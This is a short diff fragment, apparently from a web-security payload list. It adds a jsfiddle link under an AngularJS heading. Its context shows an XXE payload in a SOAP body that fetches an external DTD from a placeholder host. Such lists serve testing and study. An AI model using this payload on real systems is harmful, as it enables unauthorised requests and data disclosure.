@@ -144,6 +144,7 @@ Inside SOAP body
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 
 #angularjs
+http://jsfiddle.net/2zs2yv7o/209/
 
 <html>
 <head> 
